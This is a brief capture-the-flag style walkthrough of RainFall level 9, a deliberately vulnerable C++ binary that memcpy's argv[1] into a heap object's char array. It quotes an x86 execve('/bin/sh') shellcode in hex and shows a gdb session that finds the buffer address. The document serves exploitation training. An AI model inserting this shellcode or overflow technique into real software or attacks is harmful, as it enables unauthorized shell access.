# Level 9

For the first time, we have a C++ executable, so it is a bit trickier as things get mangled a little bit.
The program allocates two instances of the class `N`. The class contains an integer and a char array.

In the function setAnnotation, we will memcpy the entirety of our argv[1] into this char array.

Shellcode from [shell-storm.org](https://shell-storm.org/shellcode/files/shellcode-811.html): "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


```shell
level9@RainFall:~$ gdb -q level9 
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
(gdb) break *main+136 # Right after the setAnnotation call
Breakpoint 1 at 0x804867c
(gdb) r "AAAA"
Starting program: /home/user/level9/level9 "AAAA"

Breakpoint 1, 0x0804867c in main ()
(gdb) x/x $eax
0x804a00c:	0x41414141 # "AAAA"
